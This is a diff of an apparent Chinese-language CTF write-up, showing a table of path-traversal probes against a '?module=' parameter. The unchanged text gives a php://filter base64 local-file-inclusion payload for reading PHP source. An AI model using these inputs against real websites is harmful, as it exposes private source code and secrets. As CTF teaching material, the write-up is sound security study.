@@ -96,9 +96,9 @@ print(valid_user(user)) # True
 ```
 /?module=modules/api			-> success
 /?module=modules/./api 			-> success
-/?module=modules/../modules/api	-> success
-/modules/						-> 403
-/modules/api.php				-> success（或許需要有點經驗或通靈，但就算不知道這點也足夠進行下一步驟了）
+/?module=modules/../modules/api		-> success
+/modules/				-> 403
+/modules/api.php			-> success（或許需要有點經驗或通靈，但就算不知道這點也足夠進行下一步驟了）
 ```
 
 接著，根據[隨便都能查到的 LFI 的經典套路](https://google.com/search?q=LFI+CTF)，可以發現能用 `/?module=php://filter/convert.base64-encode/resource=modules/api` 讀到 base64 encode 過的原始碼，當然也可以用 `string.rot13` 之類的，反正都是一樣的意思。
